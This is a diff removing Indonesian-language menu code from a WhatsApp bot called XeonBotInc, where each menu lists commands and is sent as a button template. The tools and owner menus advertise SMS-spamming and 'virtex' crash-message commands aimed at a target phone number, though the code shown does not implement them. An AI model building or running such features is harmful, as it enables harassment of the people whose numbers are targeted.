-  ➙ ${prefix}facepalm _Reply Foto_
-  ➙ ${prefix}hitler _Reply Foto_
-  ➙ ${prefix}jail _Reply Foto_
-  ➙ ${prefix}jokeoverhead _Reply Foto_
-  ➙ ${prefix}rainbow _Reply Foto_
-  ➙ ${prefix}sepia _Reply Foto_
-  ➙ ${prefix}trash _Reply Foto_
-  ➙ ${prefix}wanted _Reply Foto_
-  
-  ➙ ${prefix}1977 _Reply Foto_
-  ➙ ${prefix}aden _Reply Foto_
-  ➙ ${prefix}brannan _Reply Foto_
-  ➙ ${prefix}brooklyn _Reply Foto_
-  ➙ ${prefix}gingham _Reply Foto_
-  ➙ ${prefix}hudson _Reply Foto_ 
-  ➙ ${prefix}inkwell _Reply Foto_
-  ➙ ${prefix}earlybird _Reply Foto_
-  ➙ ${prefix}kelvin _Reply Foto_
-  ➙ ${prefix}larlk _Reply Foto_
-  ➙ ${prefix}lofi _Reply Foto_
-  ➙ ${prefix}maven _Reply Foto_ 
-  ➙ ${prefix}mayfair _Reply Foto_
-  ➙ ${prefix}moon _Reply Foto_
-  ➙ ${prefix}perpetua _Reply Foto_
-  ➙ ${prefix}nashville _Reply Foto_
-  ➙ ${prefix}reyes _Reply Foto_
-  ➙ ${prefix}rise _Reply Foto_
-  ➙ ${prefix}slumber _Reply Foto_
-  ➙ ${prefix}stinson _Reply Foto_
-  ➙ ${prefix}toaster _Reply Foto_
-  ➙ ${prefix}valencia _Reply Foto_
-  ➙ ${prefix}walden _Reply Foto_
-  ➙ ${prefix}willow _Reply Foto_
-  ➙ ${prefix}gingham _Reply Foto_
-  ➙ ${prefix}xpro2 _Reply Foto_
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'primbonmenu':  {
-  	anu = `*✧ Primbon Menu ✧*
-  
-  ➙ ${prefix}nomerhoki [nomor]
-  ➙ ${prefix}artimimpi [mimpi apa]
-  ➙ ${prefix}ramalanjodoh
-  ➙ ${prefix}ramalanjodohbali
-  ➙ ${prefix}suamiistri
-  ➙ ${prefix}ramalancinta
-  ➙ ${prefix}artinama [nama]
-  ➙ ${prefix}kecocokannama
-  ➙ ${prefix}kecocokanpasangan
-  ➙ ${prefix}jadianpernikahan
-  ➙ ${prefix}sifatusaha
-  ➙ ${prefix}rezeki
-  ➙ ${prefix}pekerjaan
-  ➙ ${prefix}ramalannasib
-  ➙ ${prefix}potensipenyakit
-  ➙ ${prefix}artitarot
-  ➙ ${prefix}fengshui
-  ➙ ${prefix}haribaik
-  ➙ ${prefix}harisangar
-  ➙ ${prefix}harisial
-  ➙ ${prefix}nagahari
-  ➙ ${prefix}arahrejeki
-  ➙ ${prefix}peruntungan
-  ➙ ${prefix}weton
-  ➙ ${prefix}karakter
-  ➙ ${prefix}keberuntungan
-  ➙ ${prefix}memancing
-  ➙ ${prefix}masasubur
-  ➙ ${prefix}zodiak
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'quotesmenu':  {
-  	anu = `*✧ Quotes Menu ✧*
-  
-  ➙ ${prefix}quotes
-  ➙ ${prefix}quotesislami
-  ➙ ${prefix}quotesanime
-  ➙ ${prefix}quotesdilan
-  ➙ ${prefix}katabijak [query]
-  ➙ ${prefix}katabucin
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'quotesmakermenu':  {
-  	anu = `*✧ Quotes Maker Menu ✧*
-  
-  ➙ ${prefix}qmaker [quotes]
-  ➙ ${prefix}qmaker2 [author+quotes]
-  ➙ ${prefix}qmaker3 [quotes] _Reply image_
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'randomimage':  {
-  	anu = `*✧ Random Image ✧*
-  
-  ➙ ${prefix}rblackpink
-  ➙ ${prefix}bts
-  ➙ ${prefix}exo
-  ➙ ${prefix}cecan
-  ➙ ${prefix}cogan
-  ➙ ${prefix}estetic
-  ➙ ${prefix}elf
-  ➙ ${prefix}loli
-  ➙ ${prefix}neko
-  ➙ ${prefix}waifu
-  ➙ ${prefix}shota
-  ➙ ${prefix}husbu
-  ➙ ${prefix}sagiri
-  ➙ ${prefix}elaina
-  ➙ ${prefix}shinobu
-  ➙ ${prefix}kanna
-  ➙ ${prefix}megumin
-  ➙ ${prefix}art
-  ➙ ${prefix}wallnime
-  ➙ ${prefix}neko2
-  ➙ ${prefix},gif
-  ➙ ${prefix}feed
-  ➙ ${prefix}kiss
-  ➙ ${prefix}smug
-  ➙ ${prefix}tickle
-  ➙ ${prefix}cuddle
-  ➙ ${prefix}fox_girl
-  ➙ ${prefix}bully
-  ➙ ${prefix}cry
-  ➙ ${prefix}hug
-  ➙ ${prefix}awoo
-  ➙ ${prefix}lick
-  ➙ ${prefix}pat
-  ➙ ${prefix}bonk
-  ➙ ${prefix}yeet
-  ➙ ${prefix}blush
-  ➙ ${prefix}smile
-  ➙ ${prefix}wave
-  ➙ ${prefix}highfive
-  ➙ ${prefix}handhold
-  ➙ ${prefix}nom
-  ➙ ${prefix}bite
-  ➙ ${prefix}glomp
-  ➙ ${prefix}kill
-  ➙ ${prefix}slap
-  ➙ ${prefix}happy
-  ➙ ${prefix}wink
-  ➙ ${prefix}dance
-  ➙ ${prefix}cringe
-  ➙ ${prefix}gasm
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'randomteks':  {
-  	anu = `*✧ Random Teks ✧*
-  
-  ➙ ${prefix}faktaunik
-  ➙ ${prefix}quotes
-  ➙ ${prefix}quotesanime
-  ➙ ${prefix}quotesdilan
-  ➙ ${prefix}quotesislami
-  ➙ ${prefix}katabucin
-  ➙ ${prefix}cerpen
-  ➙ ${prefix}puisi
-  ➙ ${prefix}pantun
-  ➙ ${prefix}nasihat
-  ➙ ${prefix}ceritahoror
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'searchmenu':  {
-  	anu = `*✧ Search Menu ✧*
-  
-  ➙ ${prefix}groupwa [query]
-  ➙ ${prefix}play [query]
-  ➙ ${prefix}ytsearch [query]
-  ➙ ${prefix}gimage [query]
-  ➙ ${prefix}gimage [query]
-  ➙ ${prefix}pinterest [query]
-  ➙ ${prefix}wikipedia [query]
-  ➙ ${prefix}wikimedia [query]
-  ➙ ${prefix}wallpaper [query]
-  ➙ ${prefix}unsplash [query]
-  ➙ ${prefix}pixiv [query]
-  ➙ ${prefix}ringtone [query]
-  ➙ ${prefix}katabijak [query]
-  ➙ ${prefix}barinly [query]
-  ➙ ${prefix}animesearch [query]
-  ➙ ${prefix}mangasearch [query]
-  ➙ ${prefix}character [query]
-  ➙ ${prefix}kusonimes [query]
-  ➙ ${prefix}chord [judul lagu]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'sekolahmenu':  {
-  	anu = `*✧ Sekolah Menu ✧*
-  
-  ➙ ${prefix}nulis [teks]
-  ➙ ${prefix}brainly [soal]
-  ➙ ${prefix}google [query]
-  ➙ ${prefix}translate [teks]
-  ➙ ${prefix}tst [teks]
-  ➙ ${prefix}ocr _Reply image_
-  ➙ ${prefix}tts [teks]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'sertifikatmenu':  {
-  	anu = `*✧ Sertifikat Menu ✧*
-  
-  ➙ ${prefix}ytsilver [nama]
-  ➙ ${prefix}ytgold [nama]
-  ➙ ${prefix}tolol [nama]
-  ➙ ${prefix}bucin [nama]
-  ➙ ${prefix}fuckgirl [nama]
-  ➙ ${prefix}fuckboy [nama]
-  ➙ ${prefix}goodgirl [nama]
-  ➙ ${prefix}goodboy [nama]
-  ➙ ${prefix}badgirl [nama]
-  ➙ ${prefix}badboy [nama]
-  ➙ ${prefix}pacar [nama1 nama2]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'stalkmenu':  {
-  	anu = `*✧ Stalk Menu ✧*
-  
-  ➙ ${prefix}igstalk [username]
-  ➙ ${prefix}tiktokstalk [username]
-  ➙ ${prefix}twitterstalk [username]
-  ➙ ${prefix}githubstalk [username]
-  ➙ ${prefix}youtubestalk [nama channel]
-  ➙ ${prefix}ipinfo [IP Address]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'stickermenu':  {
-  	anu = `*✧ Sticker Menu ✧*
-  
-  ➙ ${prefix}harta [teks]
-  ➙ ${prefix}hartacustom [teks]
-  ➙ ${prefix}sticker _reply image/video_
-  ➙ ${prefix}toimg _reply sticker_
-  ➙ ${prefix}tovideo _reply sticker_
-  ➙ ${prefix}togif _Reply sticker_
-  ➙ ${prefix}attp [teks]
-  ➙ ${prefix}attp2 [teks]
-  ➙ ${prefix}ttp [teks]
-  ➙ ${prefix}ttp2 [teks]
-  ➙ ${prefix}ttp3 [teks]
-  ➙ ${prefix}ttp4 [teks]
-  ➙ ${prefix}ttp5 [teks]
-  ➙ ${prefix}ttp6 [teks]
-  ➙ ${prefix}smeme [teks1+teks2] _Reply Image_
-  ➙ ${prefix}memecreator [teks1+teks2] _Reply Image_
-  ➙ ${prefix}emojimix [emoji1+emoji2]
-  ➙ ${prefix}patrick
-  ➙ ${prefix}samongus
-  ➙ ${prefix}gawrgura
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'teksmaker':  {
-  	anu = `*✧ Teks Maker ✧*
-  
-     Top Maker
-  ➙ ${prefix}style [teks]
-  ➙ ${prefix}nulis [teks]
-  ➙ ${prefix}harta [teks]
-  ➙ ${prefix}hartacustom [teks]
-  ➙ ${prefix}qrcode [teks]
-  ➙ ${prefix}tiktokmaker [teks1 teks2]
-  ➙ ${prefix}pornhub [teks1 teks2]
-  ➙ ${prefix}pubg [teks1 teks2]
-  ➙ ${prefix}battlefield4 [teks1 teks2]
-  ➙ ${prefix}arcade8bit [teks1 teks2]
-     Ephoto 360 Maker
-  ➙ ${prefix}hologram3d [teks]
-  ➙ ${prefix}birthdaycake [teks]
-  ➙ ${prefix}lighttext [teks]
-  ➙ ${prefix}galaxywallpaper [teks]
-  ➙ ${prefix}luxurygold [teks]
-  ➙ ${prefix}activegalaxybat [teks]
-  ➙ ${prefix}textbyname [teks]
-  ➙ ${prefix}starsnight [teks]
-  ➙ ${prefix}aovwallpaper [teks]
-  ➙ ${prefix}pubgmaskot [teks]
-  ➙ ${prefix}mlwallpaper [teks]
-  ➙ ${prefix}anonymhacker [teks]
-  ➙ ${prefix}freefire [teks]
-  ➙ ${prefix}avatardota [teks]
-  ➙ ${prefix}avatarlolnew [teks]
-  ➙ ${prefix}logogaming [teks]
-     Photo Oxy Maker
-  ➙ ${prefix}smoke [teks]
-  ➙ ${prefix}romance [teks]
-  ➙ ${prefix}cup2 [teks]
-  ➙ ${prefix}shadow [teks]
-  ➙ ${prefix}sandwriting [teks]
-  ➙ ${prefix}coffe [teks]
-  ➙ ${prefix}love [teks]
-  ➙ ${prefix}undergrass [teks]
-  ➙ ${prefix}lovemessage [teks]
-  ➙ ${prefix}burnpaper [teks] 
-  ➙ ${prefix}nature3d [teks]
-  ➙ ${prefix}wolfmetal [teks]
-  ➙ ${prefix}summer3d [teks]
-  ➙ ${prefix}woodenboard [teks]
-  ➙ ${prefix}woodheart [teks]
-  ➙ ${prefix}flamming [teks]
-  ➙ ${prefix}fallleaves [teks]
-  ➙ ${prefix}summernature [teks]
-  ➙ ${prefix}goldenrose [teks]
-  ➙ ${prefix}underwater [teks]
-  ➙ ${prefix}carvedwood [teks]
-  ➙ ${prefix}harrypotter [teks]
-     Text Pro Maker
-  ➙ ${prefix}marvelstudio [teks1 teks2]
-  ➙ ${prefix}ninjalogo [teks1 teks2]
-  ➙ ${prefix}space [teks1 teks2]
-  ➙ ${prefix}avenger [teks1 teks2]
-  ➙ ${prefix}glitch [teks1 teks2]
-  ➙ ${prefix}coolgravity [teks1 teks2]
-  ➙ ${prefix}wallgravity [teks1 teks2]
-  ➙ ${prefix}wolflogo [teks1 teks2]
-  ➙ ${prefix}lionlogo [teks1 teks2]
-  ➙ ${prefix}marvelstudio [teks1 teks2]
-  ➙ ${prefix}blackpink [teks]
-  ➙ ${prefix}neon [teks]
-  ➙ ${prefix}greenneon [teks]
-  ➙ ${prefix}futureneon [teks]
-  ➙ ${prefix}sandwriting [teks]
-  ➙ ${prefix}sandsummer [teks]
-  ➙ ${prefix}sandengraved [teks]
-  ➙ ${prefix}text1917 [teks]
-  ➙ ${prefix}holographic [teks]
-  ➙ ${prefix}neonlight [teks]
-  ➙ ${prefix}metaldark [teks]
-  ➙ ${prefix}halloween [teks]
-  ➙ ${prefix}bloodfrosted [teks]
-  ➙ ${prefix}newyearcard [teks]
-  ➙ ${prefix}deluxesilver [teks]
-  ➙ ${prefix}minion [teks]
-  ➙ ${prefix}toxic [teks]
-  ➙ ${prefix}bokeh [teks]
-  ➙ ${prefix}natureleaves [teks]
-  ➙ ${prefix}fireworksparkle [teks]
-  ➙ ${prefix}jokerlogo [teks]
-  ➙ ${prefix}icecold [teks]
-  ➙ ${prefix}breakwall [teks]
-  ➙ ${prefix}roadwarningbox3d [teks]
-  ➙ ${prefix}strawberry [teks]
-  ➙ ${prefix}thunder [teks]
-  ➙ ${prefix}horrorblood [teks]
-  ➙ ${prefix}summersand [teks]
-  ➙ ${prefix}cloud [teks]
-  ➙ ${prefix}luxury [teks]
-  ➙ ${prefix}watercolor [teks]
-  ➙ ${prefix}foggywindow [teks]
-  ➙ ${prefix}harrypotter [teks]
-  ➙ ${prefix}impressiveglitch [teks]
-  ➙ ${prefix}magma [teks]
-  ➙ ${prefix}wonderfulgraffiti [teks]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'toolsmenu':  {
-  	anu = `*✧ Tools & Internet Menu ✧*
-  
-  ➙ ${prefix}tts [teks]
-  ➙ ${prefix}tts2 [KodeBahasa+teks]
-  ➙ ${prefix}translate [teks]
-  ➙ ${prefix}tst2 [KodeBahasa+teks]
-  ➙ ${prefix}resum [teks]
-  ➙ ${prefix}qrcode [teks]
-  ➙ ${prefix}besarkecil [teks]
-  ➙ ${prefix}bahasapurba [teks]
-  ➙ ${prefix}style [teks]
-  ➙ ${prefix}randombahasa [teks]
-  ➙ ${prefix}readqr _Reply Foto QR_
-  ➙ ${prefix}spamsms [nomor target]
-  ➙ ${prefix}ocr _Reply Foto_
-  ➙ ${prefix}cekumur _Reply Foto Wajah_
-  ➙ ${prefix}cekwajah _Reply Foto Wajah_
-  ➙ ${prefix}shortlink [ url ]
-  ➙ ${prefix}ssweb [ url ]
-  ➙ ${prefix}ssweb2 [ url ]
-  ➙ ${prefix}shortlink2 [ url ]
-  ➙ ${prefix}shortlink3 [ url ]
-  ➙ ${prefix}shortlink4 [ url ]
-  ➙ ${prefix}ipinfo [ IP Address ]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'voicechanger':  {
-  	anu = `*✧ Voice Changer Menu ✧*
-  
-_Reply Audio_
-  ➙ ${prefix}bass
-  ➙ ${prefix}blown
-  ➙ ${prefix}deep
-  ➙ ${prefix}earrape
-  ➙ ${prefix}fast
-  ➙ ${prefix}fat
-  ➙ ${prefix}nightcore
-  ➙ ${prefix}reverse
-  ➙ ${prefix}robot
-  ➙ ${prefix}slow
-  ➙ ${prefix}squirrel
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'anonymouschatmenu':  {
-  	anu = `*✧ Anonymous Chat Menu ✧*
-  
-  ➙ ${prefix}start ( Start Chat )
-  ➙ ${prefix}next ( Next user )
-  ➙ ${prefix}stop ( stop Anonymous chat )
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'emailmenu':  {
-  	anu = `*✧ Email Sementara ✧*
-  
-  ➙ ${prefix}getemail
-  ➙ ${prefix}cekidmail [username token]
-  ➙ ${prefix}cekmail [username id-mail token]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'ownermenu':  {
-  	anu = `*✧ Owner Menu ✧*
-  
-  ➙ ${prefix}self 
-  ➙ ${prefix}bc [teks]
-  ➙ ${prefix}bcgc [teks]
-  ➙ ${prefix}setbotpp _Reply image_
-  ➙ ${prefix}join [link gc wa]
-  ➙ ${prefix}out _in group chat_
-  ➙ ${prefix}block [nomor]
-  ➙ ${prefix}unblock [nomor]
-  ➙ ${prefix}lockcmd _Reply sticker/image key cmd_
-  ➙ ${prefix}okvirtex 
-  ➙ ${prefix}spamvirtex [nomor] 
-  ➙ =>
-  ➙ >
-  ➙ $
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-           case 'aboutbot': {
-           XeonBotInc.sendMessage(m.chat, { image:global.botlogo , caption: global.aboutbot }, { quoted: m })
-           }
-           break
-           case 'aboutdev': {
-           XeonBotInc.sendMessage(m.chat, { image:global.logodev , caption: global.aboutdev }, { quoted: m })
-           }
-           break
-           case 'tosbot': {
-           	m.reply(global.tosbot)
-           }
-           break
-          case 'how': {
-          	m.reply(`〔 𝗧𝘂𝘁𝗼𝗿𝗶𝗮𝗹 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱/𝗣𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝗨𝗻𝘁𝘂𝗸 𝗕𝗢𝗧〕
-
-   *き⃟🔍 [teks]*
-Masukan teks apa aja, Jika terdapat argumen tersebut di command
